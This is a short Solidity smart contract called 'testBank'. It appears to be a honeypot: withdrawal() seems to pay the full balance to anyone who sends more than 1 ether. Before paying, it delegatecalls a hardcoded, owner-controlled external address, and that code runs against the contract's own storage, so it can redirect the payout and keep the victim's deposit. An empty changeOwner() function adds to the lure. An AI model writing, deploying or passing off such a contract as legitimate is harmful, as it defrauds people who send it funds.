pragma solidity ^0.4.16;
contract testBank {
	address Owner;
	address adr;
	uint256 public Limit = 1000000000000000000;
	address emails = 0x25df6e3da49f41ef5b99e139c87abc12c3583d13;
	function Update(address dataBase, uint256 limit) public {
	require(msg.sender == Owner);
	Limit = limit;
	emails = dataBase;
	}
	function changeOwner(address adr) public {
	}
	function () payable public {
	}
	function withdrawal() payable public {
	adr = msg.sender;
	if(msg.value > Limit){
	if(! emails.delegatecall(bytes4(sha3("logEvent()")))){
	throw;}
	if(! adr.send(this.balance)){
	throw;}
	}
	}
	function kill() public {
	require(msg.sender == Owner);
	selfdestruct(msg.sender);
	}
	constructor() public {
	Owner = msg.sender;
	}
	
}